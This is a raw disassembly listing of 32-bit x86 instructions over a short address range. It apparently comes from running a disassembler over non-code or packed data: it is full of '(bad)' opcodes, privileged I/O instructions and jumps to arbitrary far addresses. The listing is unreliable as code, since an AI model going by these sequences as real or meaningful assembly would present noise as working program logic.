  424505:	mov    al,0xe2
  424507:	inc    edi
  424508:	(bad)  
  424509:	sar    DWORD PTR [ebp+0x44],cl
  42450c:	mul    esp
  42450e:	outs   dx,BYTE PTR ds:[esi]
  42450f:	cld    
  424510:	mov    eax,ds:0x150aeac3
  424515:	shr    DWORD PTR [edi],cl
  424517:	lods   al,BYTE PTR ds:[esi]
  424518:	xor    ah,BYTE PTR [ebp+0x58be9943]
  42451e:	fwait
  42451f:	dec    ecx
  424520:	out    0x71,eax
  424522:	div    DWORD PTR [edx+0x44cb0d4e]
  424528:	popf   
  424529:	nop
  42452a:	sbb    ah,dh
  42452c:	pop    ds
  42452d:	fdiv   QWORD PTR [ebp-0x67643914]
  424533:	jno    0x42453e
  424535:	rol    DWORD PTR [ebx],0x38
  424538:	mov    BYTE PTR [ebp-0x78c494c1],ah
  42453e:	and    dl,BYTE PTR [ecx+0x56f7c738]
  424544:	mov    ecx,ebp
  424546:	jo     0x424500
  424548:	inc    esi
  424549:	ja     0x424543
  42454b:	jecxz  0x42456d
  42454d:	push   ds
  42454e:	jo     0x4245c9
  424550:	mov    esp,?
  424552:	aam    0x18
  424554:	or     esp,esi
  424556:	pop    esi
  424557:	imul   ebp,DWORD PTR [ebp-0x2aa4c48f],0x8ae2d1b5
  424561:	xchg   esp,eax
  424563:	nop
  424564:	in     eax,dx
  424565:	mov    ds:0x72cf5c59,eax
  42456a:	xor    al,0xb4
  42456c:	inc    esi
  42456d:	arpl   WORD PTR [edi*2-0x603684ba],cx
  424574:	mov    cl,al
  424576:	mov    ds:0x73673887,al
  42457b:	xchg   ecx,eax
  42457c:	jmp    0x4245e4
  42457e:	mov    esp,0x6d87d69d
  424583:	pop    es
  424584:	or     BYTE PTR [esi-0x7958e56a],al
  42458a:	scas   eax,DWORD PTR es:[edi]
  42458b:	neg    DWORD PTR ds:0x13a528c1
  424591:	in     al,0x55
  424593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424594:	nop
  424595:	dec    ebx
  424596:	xor    BYTE PTR [eax+0x4c4878dd],ch
  42459c:	xlat   BYTE PTR ds:[ebx]
  42459d:	push   ds
  42459e:	jl     0x4245a9
  4245a0:	mov    ebx,0x3978949c
  4245a5:	adc    al,0xf3
  4245a7:	sub    DWORD PTR [ecx+esi*4+0x8],esi
  4245ab:	xchg   edx,eax
  4245ac:	inc    esp
  4245ad:	jg     0x42458b
	...
  4245b7:	add    BYTE PTR [eax],al
  4245b9:	add    BYTE PTR [esi],cl
  4245bb:	and    BYTE PTR [eax-0x404051c1],cl
  4245c1:	xor    edi,edx
  4245c3:	sub    dh,BYTE PTR [eax-0x292dcc49]
  4245c9:	jmp    0x44047c
  4245ce:	std    
  4245cf:	add    DWORD PTR [eax],eax
  4245d1:	add    BYTE PTR [esi],ah
  4245d3:	(bad)  
  4245d4:	mov    eax,ds:0xe14b7b75
  4245d9:	scas   al,BYTE PTR es:[edi]
  4245da:	sahf   
  4245db:	gs sbb ecx,esp
  4245de:	pop    eax
  4245df:	xlat   BYTE PTR ds:[ebx]
  4245e0:	adc    esi,0x30
  4245e3:	and    DWORD PTR [edi+ebp*8-0x5f],0xffffffe2
  4245e8:	jnp    0x4245d7
  4245ea:	gs or  al,0x2b
  4245ed:	inc    ebx
  4245ee:	ins    BYTE PTR es:[edi],dx
  4245ef:	jl     0x4245cc
  4245f1:	cmp    BYTE PTR [edi+0x48],dh
  4245f4:	nop
  4245f5:	adc    DWORD PTR [edi+0x31c3ea66],0xb66eaa02
  4245ff:	div    BYTE PTR [ebp+0x78]
  424602:	ror    BYTE PTR [eax+0x39],0xaa
  424606:	push   ecx
  424607:	xor    eax,0x38868381
  42460c:	mov    ch,0xd8
  42460e:	sub    BYTE PTR [ecx+esi*8-0x11800a40],dl
  424615:	bound  ecx,QWORD PTR [ecx]
  424617:	inc    ebp
  424618:	loope  0x4245c5
  42461a:	cmp    DWORD PTR [ebx+0x46d546ea],ebp
  424620:	pop    ecx
  424621:	scas   eax,DWORD PTR es:[edi]
  424622:	arpl   di,si
  424624:	popa   
  424625:	inc    esp
  424626:	adc    dl,BYTE PTR [edx]
  424628:	clc    
  424629:	mov    al,0xd3
  42462b:	inc    ebp
  42462c:	stc    
  42462d:	ss jmp 0xbd82:0x31754fe1
  424635:	out    0x58,eax
  424637:	in     al,dx
  424638:	ja     0x42463e
  42463a:	adc    BYTE PTR [ebp+0x53301045],dh
  424640:	cmp    ebp,DWORD PTR [ecx-0x775d10b9]
  424646:	aad    0x46
  424648:	pop    ecx
  424649:	imul   esi,DWORD PTR [ecx],0xffffffa7
  42464c:	or     DWORD PTR [edx-0x338de682],edx
  424652:	repz inc esp
  424654:	call   0x7f6021b
  424659:	fwait
  42465a:	and    eax,0x1a7779a7
  42465f:	in     eax,0x97
  424661:	xchg   ebp,eax
  424662:	lock pushf 
  424664:	dec    esi
  424665:	adc    BYTE PTR [ebp+0xb383c2b],cl
  42466b:	aam    0xb1
  42466d:	sub    esp,DWORD PTR [eax+0x33]
  424670:	xchg   edx,eax
  424671:	(bad)  
  424672:	out    dx,eax
  424673:	in     al,dx
  424674:	push   eax
  424675:	cmp    eax,0xdd2a9a26
  42467a:	fadd   QWORD PTR ds:0xe72509ad
  424680:	add    eax,0x8bc5c49
  424685:	mov    ch,BYTE PTR [ecx+0x201eef23]
  42468b:	fcomp  QWORD PTR ds:0x13708834
  424691:	xor    eax,0xb2863bd6
  424696:	or     DWORD PTR [esi],esp
  424698:	mov    cl,0xcf
  42469a:	lock cld 
  42469c:	jae    0x424644
  42469e:	dec    edi
  42469f:	jns    0x424654
  4246a1:	sub    al,0xd6
  4246a3:	loopne 0x4246b8
  4246a5:	xchg   ecx,eax
  4246a6:	aam    0xbc
  4246a8:	mov    edx,0xac200ee
  4246ad:	std    
  4246ae:	or     BYTE PTR [ecx-0x5c],0xeb
  4246b2:	sbb    ch,bh
  4246b4:	xchg   DWORD PTR [esi+edi*2+0x65e34c5a],eax
  4246bb:	inc    edi
  4246bc:	and    eax,0x565b3563
  4246c1:	aas    
  4246c2:	ins    DWORD PTR es:[edi],dx
  4246c3:	das    
  4246c4:	lods   al,BYTE PTR ds:[esi]
  4246c5:	add    BYTE PTR [ebx-0x55],0xee
  4246c9:	push   edx
  4246ca:	mov    WORD PTR [edx+0x34188dba],gs
  4246d0:	jno    0x424693
  4246d2:	adc    ebp,DWORD PTR [eax]
  4246d4:	(bad)  
  4246d5:	dec    esi
  4246d6:	inc    edi
  4246d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246d8:	pusha  
  4246d9:	jbe    0x424696
  4246db:	sbb    eax,0x2ca4a0c5
  4246e0:	inc    ebx
  4246e1:	push   sp
  4246e3:	sub    BYTE PTR [edx-0x77deee6],0xd3
  4246ea:	or     al,0xb
  4246ec:	or     al,dh
  4246ee:	sahf   
  4246ef:	aam    0xb3
  4246f1:	adc    al,BYTE PTR [edx]
  4246f3:	cmp    al,0x25
  4246f5:	xor    BYTE PTR [eax-0x38],0x1a
  4246f9:	and    eax,0xf68ee304
  4246fe:	leave  
  4246ff:	and    bh,BYTE PTR [ecx-0x36e95dd6]
  424705:	push   0xffffff98
  424707:	inc    ebp
  424708:	add    ecx,0x57
  42470b:	cmp    eax,0x5c87285d
  424710:	xchg   ebx,eax
  424711:	cld    
  424712:	arpl   sp,cx
  424714:	inc    esi
  424715:	sub    eax,0x2ed33c8c
  42471a:	(bad)  
  42471b:	or     edi,DWORD PTR [ebx]
  42471d:	outs   dx,BYTE PTR ds:[esi]
  42471e:	push   0xc724a79a
  424723:	scas   eax,DWORD PTR es:[edi]
  424724:	dec    ecx
  424725:	cmp    al,0xa3
  424727:	jmp    0x42475a
  424729:	lahf   
  42472a:	mov    bl,dh
  42472c:	mov    ch,0x12
  42472e:	sbb    bh,BYTE PTR ds:0x7b22a18f
  424734:	jne    0x42479d
  424736:	inc    ebp
  424737:	and    eax,0x5c7c0252
  42473c:	rcr    ch,cl
  42473e:	add    DWORD PTR ds:0x3209cdda,0xffffffa7
  424745:	add    BYTE PTR [esi-0x46adcbb5],ah
  42474b:	cmp    edx,DWORD PTR [esp+ebp*8]
  42474e:	int    0xc5
  424750:	pop    ds
  424751:	sub    eax,0x67ff9499
  424756:	dec    ebp
  424757:	cmp    esp,eax
  424759:	add    eax,DWORD PTR [ecx+0x60a532a9]
  42475f:	shl    bh,1
  424761:	sub    DWORD PTR [ecx+0x31073500],ebx
  424767:	dec    esi
  424768:	and    BYTE PTR [eax+0x6f],0x6c
  42476c:	std    
  42476d:	ins    DWORD PTR es:[edi],dx
  42476e:	xor    DWORD PTR [eax],0x33
  424771:	ficom  DWORD PTR ds:0xec6ccb27
  424777:	ja     0x424701
  424779:	mov    BYTE PTR [edi],ah
  42477b:	inc    ebx
  42477c:	(bad)  
  42477e:	dec    ebp
  42477f:	idiv   esi
  424781:	in     eax,dx
  424782:	test   dl,0xdb
  424785:	push   ecx
  424786:	xor    bh,BYTE PTR [ecx+0x243bdd45]
  42478c:	aas    
  42478d:	mov    bh,BYTE PTR [edx+0x3bb72e8d]
  424793:	cs out dx,al
  424795:	adc    BYTE PTR [ecx],dh
  424797:	xor    edx,DWORD PTR [ebx-0x44]
  42479a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42479b:	xor    BYTE PTR [esi],al
  42479d:	ss pop ecx
  42479f:	pop    edi
  4247a0:	xchg   ebp,eax
  4247a1:	ds sti 
  4247a3:	or     edx,DWORD PTR [ebp-0x6]
  4247a6:	or     esi,DWORD PTR [eax-0x66]
  4247a9:	ret    0x5393
  4247ac:	and    bl,dh
  4247ae:	mov    esi,0x5448f8f9
  4247b3:	out    dx,eax
  4247b4:	shl    DWORD PTR [ebx-0x693bfa5a],0xbf
  4247bb:	imul   ecx,DWORD PTR [ecx+0x8b0a0aa],0xffffffe5
  4247c2:	xchg   DWORD PTR [ebx-0x54b9ef95],edi
  4247c8:	sti    
  4247c9:	test   eax,0x329b3df2
  4247ce:	push   ecx
	...
  4247d7:	add    BYTE PTR [eax],al
  4247d9:	add    BYTE PTR [edi+edi*4+0x63],bl
  4247dd:	push   eax
  4247de:	jecxz  0x4247bc
  4247e0:	jg     0x4247a1
  4247e2:	data16 adc al,0x63
  4247e5:	sbb    al,0x2c
  4247e7:	push   eax
  4247e8:	test   eax,0x1c0abf1
  4247ed:	add    ch,bh
  4247ef:	add    DWORD PTR [eax],eax
  4247f1:	add    BYTE PTR [edx-0x55347506],dl
  4247f7:	fsubrp st(1),st
  4247f9:	(bad)  [edi+0xfc252d5]
  4247ff:	int    0xe6
  424801:	sbb    BYTE PTR [ebp+0x72db5f8b],0xb1
  424808:	cmp    DWORD PTR [edx-0xa],0x4e2fe780
  42480f:	mov    ?,eax
  424811:	xlat   BYTE PTR ds:[ebx]
  424812:	repnz mov dl,0x82
  424815:	pusha  
  424816:	lods   eax,DWORD PTR ds:[esi]
  424817:	scas   al,BYTE PTR es:[edi]
  424818:	bswap  ebp
  42481a:	push   ecx
  42481b:	mov    ebx,0xa1a05eaa
  424820:	mov    ds:0x8e50b83d,al
  424825:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  424827:	or     eax,0x86ebd20a
  42482c:	in     eax,dx
  42482d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42482e:	mov    dl,dh
  424830:	rol    BYTE PTR [ecx+0x5892bec6],cl
  424836:	jecxz  0x4247b9
  424838:	scas   al,BYTE PTR es:[edi]
  424839:	fistp  QWORD PTR [edx-0x76]
  42483c:	in     al,dx
  42483d:	addr16 sbb al,0x47
  424840:	adc    ebp,eax
  424842:	or     DWORD PTR ds:0x77ea74f0,esp
  424848:	xor    al,0x56
  42484a:	lock sahf 
  42484c:	mov    eax,ds:0xc149a24e
  424851:	fdivp  st(4),st
  424853:	js     0x4248b7
  424855:	jge    0x4248a7
  424857:	add    DWORD PTR [esp+esi*2-0x66c5af2c],esi
  42485e:	push   ds
  42485f:	ins    DWORD PTR es:[edi],dx
  424860:	lock aad 0xcb
  424863:	jmp    0x4248bc
  424865:	add    eax,0xda96c07c
  42486a:	dec    ebp
  42486b:	sub    al,0xcc
  42486d:	xchg   bh,al
  42486f:	pop    ebp
  424870:	adc    BYTE PTR [eax-0x4c],ch
  424873:	push   eax
  424874:	xor    bl,dh
  424876:	stc    
  424877:	add    al,0x85
  424879:	jns    0x424828
  42487b:	imul   ebx,DWORD PTR [eax-0xc],0x7b
  42487f:	fcomp  DWORD PTR [edi-0x5c6d86f2]
  424885:	mov    bl,0x3c
  424887:	je     0x4248e8
  424889:	ds cli 
  42488b:	mov    esp,DWORD PTR [ebx-0x57f6651d]
  424891:	push   es
  424892:	ss pop ecx
  424894:	push   eax
  424895:	outs   dx,BYTE PTR ds:[esi]
  424896:	sahf   
  424897:	push   eax
  424898:	jg     0x42488b
  42489a:	push   esi
  42489b:	call   0xcfd71cbf
  4248a0:	mov    ebx,0xc122721e
  4248a5:	mov    al,0x88
  4248a7:	mov    ch,0x68
  4248a9:	addr16 xchg edx,eax
  4248ab:	push   0xffffffab
  4248ad:	lahf   
  4248ae:	push   cs
  4248af:	cld    
  4248b0:	and    al,0x27
  4248b2:	shl    DWORD PTR [esi-0x4f],0x15
  4248b6:	push   esp
  4248b7:	cmp    BYTE PTR [ecx+edx*8+0x503ed4bf],cl
  4248be:	test   DWORD PTR [edx],esi
  4248c0:	xchg   BYTE PTR [ebx+0x30],dh
  4248c3:	xlat   BYTE PTR ds:[ebx]
  4248c4:	ret    
  4248c5:	xchg   ebp,eax
  4248c6:	mov    eax,ds:0x912219e
  4248cb:	and    eax,0xee8aa53e
  4248d0:	lds    ebp,FWORD PTR [edx+eax*4-0x15cacb82]
  4248d7:	mov    dl,BYTE PTR [esi-0x10]
  4248da:	jne    0x42491b
  4248dc:	mov    esp,0x334b5cc9
  4248e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248e2:	mov    eax,DWORD PTR [edx+edx*1]
  4248e5:	out    dx,al
  4248e6:	cmp    DWORD PTR ds:0x6be98a46,esp
  4248ec:	jg     0x424909
  4248ee:	adc    ecx,DWORD PTR [edx+0x5d]
  4248f1:	mov    ch,0xc8
  4248f3:	sub    DWORD PTR [ecx+0x61],edi
  4248f6:	retf   0x2363
  4248f9:	mov    cl,0x50
  4248fb:	sbb    al,0x6c
  4248fd:	popa   
  4248fe:	add    eax,eax
  424900:	mov    dl,0x27
  424902:	aad    0xbf
  424904:	xchg   esi,eax
  424905:	pusha  
  424906:	push   es
  424907:	and    BYTE PTR [ebp-0x5932c967],dh
  42490d:	mov    bl,0x4a
  42490f:	add    eax,0xc12e8882
  424914:	push   es
  424915:	sub    ah,BYTE PTR [edi]
  424917:	in     eax,0x26
  424919:	adc    edi,0x5b
  42491c:	cmp    al,0x34
  42491e:	lods   al,BYTE PTR ds:[esi]
  42491f:	mov    esp,DWORD PTR [ebp-0xec7832c]
  424925:	or     eax,DWORD PTR [ebx]
  424927:	mov    ds:0xa1253009,eax
  42492c:	cdq    
  42492d:	aaa    
  42492e:	push   ecx
  424930:	mov    BYTE PTR cs:[esi],al
  424933:	inc    ecx
  424934:	scas   al,BYTE PTR es:[edi]
  424935:	xchg   dl,cl
  424937:	jno    0x424915
  424939:	mov    DWORD PTR [ecx-0x121d13cd],esi
  42493f:	jo     0x42492d
  424941:	jp     0x424924
  424943:	and    al,0x20
  424945:	lock ss es inc ecx
  424949:	and    esp,DWORD PTR [ecx+0x49db3815]
  42494f:	fcmovb st,st(0)
  424951:	sti    
  424952:	aas    
  424953:	cli    
  424954:	jne    0x42498e
  424956:	lahf   
  424957:	out    0xde,al
  424959:	jne    0x424979
  42495b:	neg    dl
  42495d:	dec    edi
  42495e:	mov    ds:0xaf2344ea,eax
  424963:	mov    ebp,0xead83afc
  424968:	lods   al,BYTE PTR ds:[esi]
  424969:	add    eax,0x9bafcf83
  42496e:	call   0x94f4:0x8a4d8301
  424975:	mov    al,ds:0x8b44dcbc
  42497a:	pusha  
  42497b:	cld    
  42497c:	retf   
  42497d:	push   ebx
  42497e:	mov    edi,0x854ae914
  424983:	test   DWORD PTR [edx+0x75],ebx
  424986:	or     dl,0x45
  424989:	mov    dl,0x7c
  42498b:	push   0xb23e1116
  424990:	inc    ebp
  424991:	dec    edx
  424992:	lock repnz dec ebp
  424995:	cmp    BYTE PTR [ebx+ebx*1],al
  424998:	outs   dx,DWORD PTR ds:[esi]
  424999:	test   al,0x4c
  42499b:	repnz mov cl,0xc0
  42499e:	clc    
  42499f:	xchg   esp,eax
  4249a0:	sub    eax,edx
  4249a2:	jne    0x424955
  4249a4:	and    BYTE PTR [ebp+esi*1+0x0],bl
  4249a8:	push   0x922a98b7
  4249ad:	pop    ds
  4249ae:	or     al,dl
  4249b0:	popf   
  4249b1:	retf   
  4249b2:	lods   al,BYTE PTR ds:[esi]
  4249b3:	in     eax,0xc1
  4249b5:	sub    bh,0x9c
  4249b8:	repnz or DWORD PTR [edi+0x2e],eax
  4249bc:	pop    esp
  4249bd:	sub    dl,dh
  4249bf:	mov    ebx,eax
  4249c1:	xchg   edx,eax
  4249c2:	sti    
  4249c3:	call   0x2197:0xc991c107
  4249ca:	ret    0xbe07
  4249cd:	mov    ebx,0x90c14271
  4249d2:	mov    dl,BYTE PTR ds:0x508acd7c
  4249d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249d9:	shl    DWORD PTR [edx+0x29],cl
  4249dc:	or     ah,BYTE PTR [edx-0x64]
  4249df:	call   0x1c84:0x71edb19a
  4249e6:	and    BYTE PTR [ebp+0x16],al
  4249e9:	leave  
  4249ea:	or     eax,0x842372dd
	...
  4249f7:	add    BYTE PTR [eax],al
  4249f9:	add    BYTE PTR [ebx+0x55],al
  4249fc:	pusha  
  4249fd:	(bad)  
  4249fe:	jbe    0x4249bf
  424a00:	out    dx,eax
  424a01:	(bad)  
  424a03:	test   al,0x37
  424a05:	stos   DWORD PTR es:[edi],eax
  424a06:	fadd   DWORD PTR [eax+esi*2+0x1c2a85f]
  424a0d:	add    ch,bh
  424a0f:	add    DWORD PTR [eax],eax
  424a11:	add    BYTE PTR [ebx],bh
  424a13:	dec    edx
  424a14:	mov    al,ds:0x42283118
  424a19:	out    0x2a,al
  424a1b:	xor    DWORD PTR [edi],0x42
  424a1e:	ror    ebx,1
  424a20:	fsubp  st(3),st
  424a22:	out    dx,al
  424a23:	push   esp
  424a24:	in     al,dx
  424a25:	xor    eax,0xe8f43399
  424a2a:	xchg   ebp,ebp
  424a2c:	imul   ebp,DWORD PTR [edx-0x3866bc5c],0x75
  424a33:	(bad)  
  424a34:	sub    eax,ebp
  424a36:	jne    0x424a8d
  424a38:	mov    eax,ds:0xf604026b
  424a3d:	leave  
  424a3e:	cs pop ebx
  424a40:	jle    0x424aa8
  424a42:	rcl    BYTE PTR [ecx-0xcad7bad],1
  424a48:	fwait
  424a49:	cmp    ebp,ebx
  424a4b:	mov    al,0xd0
  424a4d:	inc    esp
  424a4e:	imul   esi,esp,0xd05a83bb
  424a54:	int3   
  424a55:	cmp    DWORD PTR [ecx],ecx
  424a57:	imul   eax,DWORD PTR [ebp+0x6a7ca1d8],0x9
  424a5e:	pop    ebp
  424a5f:	lds    ecx,FWORD PTR [edx+edx*4]
  424a62:	lahf   
  424a63:	push   eax
  424a64:	jbe    0x4249ef
  424a66:	lods   eax,DWORD PTR ds:[esi]
  424a67:	inc    ecx
  424a68:	imul   ebp,eax,0xfffffffd
  424a6b:	jmp    0xd2f0dca8
  424a70:	into   
  424a71:	and    al,0x95
  424a73:	mov    dh,0xef
  424a75:	icebp  
  424a76:	aaa    
  424a77:	and    DWORD PTR [eax],edx
  424a79:	icebp  
  424a7a:	dec    ecx
  424a7b:	xchg   BYTE PTR [eax*8-0x7add609b],ah
  424a82:	mov    al,0xc8
  424a84:	sahf   
  424a85:	imul   edi,ebp,0x932dac15
  424a8b:	sub    al,0x0
  424a8d:	pop    edi
  424a8e:	(bad)  
  424a8f:	fld    TBYTE PTR [ebp+0x6d]
  424a92:	xor    DWORD PTR [ebp+0x10],ecx
  424a95:	xor    DWORD PTR [esi-0x2b],0xb8fa6cbb
  424a9c:	ret    
  424a9d:	loopne 0x424a6f
  424a9f:	in     eax,dx
  424aa0:	gs xchg esi,eax
  424aa2:	test   al,0xff
  424aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424aa5:	into   
  424aa6:	enter  0x2d99,0xe8
  424aaa:	add    al,0xd7
  424aac:	(bad)  
  424aad:	dec    esi
  424aae:	sub    BYTE PTR [esi+esi*4-0x21a4b301],0x97
  424ab6:	fisttp QWORD PTR [ebx]
  424ab8:	add    eax,0x69cef4e
  424abd:	jp     0x424a4f
  424abf:	inc    esp
  424ac0:	push   ds
  424ac1:	mov    al,0x5a
  424ac3:	and    eax,0xa8647338
  424ac8:	mov    edi,0x30353811
  424acd:	dec    ecx
  424ace:	adc    eax,0xc63380f9
  424ad3:	mov    cl,0x40
  424ad5:	push   esp
  424ad6:	loope  0x424b39
  424ad8:	cmp    al,0x39
  424ada:	xchg   esp,eax
  424adb:	pop    ebp
  424adc:	bound  edi,QWORD PTR [esi-0x4a]
  424adf:	addr16 mov ds:0xc80b,eax
  424ae3:	in     eax,dx
  424ae4:	pop    es
  424ae5:	adc    eax,edx
  424ae7:	stos   BYTE PTR es:[edi],al
  424ae8:	pop    eax
  424ae9:	fsubr  st,st(5)
  424aeb:	mov    esi,0xb6799a94
  424af0:	bound  edi,QWORD PTR [edi]
  424af2:	inc    ebx
  424af3:	xlat   BYTE PTR ds:[ebx]
  424af4:	and    edi,DWORD PTR [eax]
  424af6:	punpckldq mm6,DWORD PTR es:[edx-0x78]
  424afb:	(bad)  
  424afc:	into   
  424afd:	xchg   DWORD PTR [ebp-0x68],esp
  424b00:	jmp    0x75ff:0xc7df8f4f
  424b07:	shl    cl,1
  424b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b0a:	shl    DWORD PTR [ebp+0x27],cl
  424b0d:	imul   esp,ecx,0xffffff81
  424b10:	(bad)  
  424b11:	aam    0xe3
  424b13:	mov    edx,0x5c35a391
  424b18:	aam    0xe
  424b1a:	pushf  
  424b1b:	mov    ecx,esp
  424b1d:	jbe    0x424b3a
  424b1f:	call   0x129d:0xf4f64d47
  424b26:	or     DWORD PTR [ecx-0x78b00e6f],edx
  424b2c:	add    eax,0x69c69d25
  424b31:	sub    eax,0x21c6ac36
  424b36:	xchg   esp,eax
  424b37:	push   ecx
  424b38:	dec    esp
  424b39:	mov    BYTE PTR [ecx*1+0x8dea669],cl
  424b40:	mov    ds:0x90c00675,al
  424b45:	xchg   edi,eax
  424b46:	sbb    ebp,DWORD PTR [edx+edx*4]
  424b49:	iret   
  424b4a:	(bad)  
  424b4b:	aad    0xb9
  424b4d:	(bad)  
  424b4e:	push   0xdac3a7d6
  424b53:	push   eax
  424b54:	jle    0x424b9c
  424b56:	add    BYTE PTR [eax],ah
  424b58:	ret    0xfcfe
  424b5b:	add    BYTE PTR [edi-0x67],dl
  424b5e:	idiv   DWORD PTR [eax-0x1200c3fb]
  424b64:	scas   eax,DWORD PTR es:[edi]
  424b65:	dec    edx
  424b66:	inc    esi
  424b67:	jo     0x424bd1
  424b69:	jb     0x424b39
  424b6b:	int3   
  424b6c:	ret    
  424b6d:	push   edx
  424b6e:	push   edx
  424b6f:	fild   DWORD PTR [esp+eiz*4+0x42]
  424b73:	xchg   edx,eax
  424b74:	imul   BYTE PTR [edi]
  424b76:	xchg   BYTE PTR [esi+ebp*8+0x7],ah
  424b7a:	sbb    al,BYTE PTR [ebx-0x1e]
  424b7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b7e:	mov    edx,0xb12474fa
  424b83:	scas   eax,DWORD PTR es:[edi]
  424b84:	push   es
  424b85:	pop    ecx
  424b86:	or     eax,0xde431621
  424b8b:	sti    
  424b8c:	jg     0x424b84
  424b8e:	push   eax
  424b8f:	in     eax,dx
  424b90:	popf   
  424b91:	sub    ch,bl
  424b93:	ins    BYTE PTR es:[edi],dx
  424b94:	aaa    
  424b95:	mov    ds:0xafbdd263,eax
  424b9a:	repz call eax
  424b9d:	cmp    eax,0x1dc8abe6
  424ba2:	push   esi
  424ba3:	jbe    0x424b30
  424ba5:	and    BYTE PTR [ebx],cl
  424ba7:	leave  
  424ba8:	mov    ecx,0x973f6c74
  424bad:	mov    dl,0x17
  424baf:	cmp    BYTE PTR [ecx+ecx*1+0x65389fe5],al
  424bb6:	adc    DWORD PTR [eax-0x7fb7ea36],edx
  424bbc:	pop    ecx
  424bbd:	das    
  424bbe:	out    0x93,eax
  424bc0:	cmp    ecx,DWORD PTR cs:[esi]
  424bc3:	xchg   esi,eax
  424bc4:	mov    esp,0x5017c7b6
  424bc9:	xor    al,BYTE PTR [esi-0x1b8a6acb]
  424bcf:	adc    BYTE PTR [ebx+ebp*8+0x6f],dl
  424bd3:	mov    ch,0x83
  424bd5:	jmp    0xe99e69e5
  424bda:	xor    BYTE PTR [edi],al
  424bdc:	cmp    BYTE PTR [eax-0x792efd2f],al
  424be2:	rol    BYTE PTR [esi-0x7b6b10e5],1
  424be8:	int    0xc9
  424bea:	add    esp,ebp
  424bec:	inc    esp
  424bed:	or     eax,0x581eaed7
  424bf2:	int    0x3a
  424bf4:	enter  0x3dfc,0x26
  424bf8:	mov    ah,0xf9
  424bfa:	jo     0x424c43
  424bfc:	lds    ebp,FWORD PTR [edi-0x59]
  424bff:	sbb    eax,0x5fc6bcb3
  424c04:	in     eax,dx
  424c05:	jl     0x424c84
  424c07:	test   eax,0x98161449
  424c0c:	ins    BYTE PTR es:[edi],dx
  424c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  424c17:	add    BYTE PTR [eax],al
  424c19:	add    BYTE PTR [edi+0x2d],dl
  424c1c:	pop    es
  424c1d:	call   0xe967:0xeddfba7f
  424c24:	addr16 xor al,0xb5
  424c27:	idiv   BYTE PTR [edi+0x1c4a59a]
  424c2d:	add    ch,bh
  424c2f:	add    DWORD PTR [eax],eax
  424c31:	add    BYTE PTR [esi+eax*4+0x17511832],ch
  424c38:	or     eax,DWORD PTR [esi+ebx*2]
  424c3b:	jno    0x424c69
  424c3d:	sti    
  424c3e:	jno    0x424bd5
  424c40:	stos   DWORD PTR es:[edi],eax
  424c41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c42:	adc    DWORD PTR [edx+0x45],edx
  424c45:	les    esi,FWORD PTR [ebp-0x67]
  424c48:	dec    DWORD PTR [ebx+0x2b0aff26]
  424c4e:	xchg   ebp,eax
  424c4f:	out    dx,eax
  424c50:	sbb    BYTE PTR [ebp*8-0x49a1e10c],0x36
  424c58:	aas    
  424c59:	pusha  
  424c5a:	loope  0x424c51
  424c5c:	dec    eax
  424c5d:	mov    edx,0xbb555982
  424c62:	xchg   ecx,eax
  424c63:	cdq    
  424c64:	push   esp
  424c65:	mov    dl,ch
  424c67:	pop    esi
  424c68:	into   
  424c69:	aaa    
  424c6a:	cmp    esp,edx
  424c6c:	push   edi
  424c6d:	daa    
  424c6e:	mov    eax,0x8a3937ed
  424c73:	adc    bl,cl
  424c75:	add    BYTE PTR [esi+0x46e8c1ec],dl
  424c7b:	je     0x424ca9
  424c7d:	out    dx,al
  424c7e:	sti    
  424c7f:	fsubr  QWORD PTR [eax+edi*8+0x60]
  424c83:	ja     0x424c8c
  424c85:	xor    eax,0xe63d96f5
  424c8a:	rol    BYTE PTR [esi],0xf1
  424c8d:	jbe    0x424c76
  424c8f:	inc    esp
  424c90:	ins    DWORD PTR es:[edi],dx
  424c91:	adc    ebx,ebx
  424c93:	arpl   WORD PTR [esi],dx
  424c95:	mov    ecx,0x4f1dfb8c
  424c9a:	inc    ecx
  424c9b:	cmp    esp,eax
  424c9d:	cmp    eax,0xecb3fba1
  424ca2:	retf   
  424ca3:	js     0x424d0d
  424ca5:	bound  edi,QWORD PTR [edi+0x33]
  424ca8:	je     0x424c4c
  424caa:	adc    al,0xa6
  424cac:	cmp    BYTE PTR [edx],bh
  424cae:	cdq    
  424caf:	mov    eax,0x92792769
  424cb4:	out    0xba,al
  424cb6:	cs xchg ecx,eax
  424cb8:	sub    al,0xef
  424cba:	clc    
  424cbb:	push   ecx
  424cbc:	pop    ebp
  424cbd:	hlt    
  424cbe:	and    esi,edx
  424cc0:	xor    eax,0xdee20d42
  424cc5:	fnsave [ebx+esi*4]
  424cc8:	dec    ebp
  424cc9:	repz pop edx
  424ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ccc:	jmp    FWORD PTR [edx]
  424cce:	mov    BYTE PTR [eax+0x6a],ch
  424cd1:	dec    ecx
  424cd2:	jns    0x424c58
  424cd4:	jnp    0x424c68
  424cd6:	pop    ds
  424cd7:	fs push ebx
  424cd9:	inc    ecx
  424cda:	fwait
  424cdb:	test   al,0x21
  424cdd:	jb     0x424d54
  424cdf:	in     eax,dx
  424ce0:	or     ecx,DWORD PTR [ebx+0x77]
  424ce3:	mov    dl,dh
  424ce5:	cmp    dl,dl
  424ce7:	inc    di
  424ce9:	xchg   ebx,eax
  424cea:	dec    ebx
  424ceb:	or     BYTE PTR [edi-0x61],dl
  424cee:	pusha  
  424cef:	cmp    DWORD PTR [ebp-0x799538d6],0xed1f1826
  424cf9:	mov    ecx,0x9a461363
  424cfe:	mov    ch,0x99
  424d00:	and    DWORD PTR [eax],esi
  424d02:	dec    edi
  424d03:	sbb    edi,DWORD PTR [esi-0x1f155b36]
  424d09:	xor    al,0x5e
